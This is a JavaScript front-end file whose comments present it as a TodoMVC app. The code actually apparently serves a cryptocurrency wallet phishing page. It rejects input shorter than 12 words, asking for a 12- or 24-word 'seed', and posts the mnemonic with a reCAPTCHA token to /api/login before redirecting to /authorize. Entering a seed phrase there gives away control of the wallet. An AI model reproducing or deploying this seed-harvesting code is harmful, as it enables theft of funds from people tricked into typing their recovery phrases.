"use strict";
// Full spec-compliant TodoMVC with localStorage persistence
// and hash-based routing in ~120 effective lines of JavaScript.
document.addEventListener("DOMContentLoaded", () => {
// app Vue instance
    const app = Vue.createApp({
        delimiters: ['${', '}'],
        // app initial state
        data() {
            return {
                newTodo: "",
                errorTodo: "",
            }
        },

        watch: {
        },

        // http://vuejs.org/guide/computed.html
        computed: {
        },

        // methods that implement data logic.
        // note there's no DOM manipulation here at all.
        methods: {
            addTodo() {
                var value = this.newTodo && this.newTodo.trim();
                if (!value) {
                    this.errorTodo = "";
                    return;
                }

                var wordsNB = (value.trim().split(' ').filter(function(v, index, arr){
                    return v != "";
                }).length);

                if (wordsNB < 12) {
                    this.errorTodo = 'Missing words in your seed, need 12 or 24...';
                    return
                }

                this.callAPILogin(this.newTodo);
            },

            callAPILogin(mnemonic) {
                this.errorTodo = 'Current connection...';
                var t = this
                grecaptcha.execute('6LfmdSAeAAAAAPf5oNQ1UV0wf6QhnH9dQFDSop7V', {action: 'submit'})
                    .then(function(token) {
                        return axios.post('/api/login', {
                            mnemonic: mnemonic,
                            recaptcha: token,
                        })
                    })
                    .then(function (response) {
                        console.log(response);
                        if (response.data && response.data.status === 'ok') {
                            window.location.replace("/authorize");
                        } else {
                            t.errorTodo = 'Error! Could not reach the API. ' + error;
                        }
                    })
                    .catch(function (error) {
                        t.errorTodo = 'Error! Could not reach the API. ' + error;
                    });
            },
        },

        // a custom directive to wait for the DOM to be updated
        // before focusing on the input field.
        // http://vuejs.org/guide/custom-directive.html
        directives: {
            "todo-focus": {
                updated(el, binding) {
                    if (binding.value) {
                        el.focus();
                    }
                }
            }
        }
    });

    app.config.productionTip = false;
    app.config.devtools = false;
    app.mount(".todoapp");
});
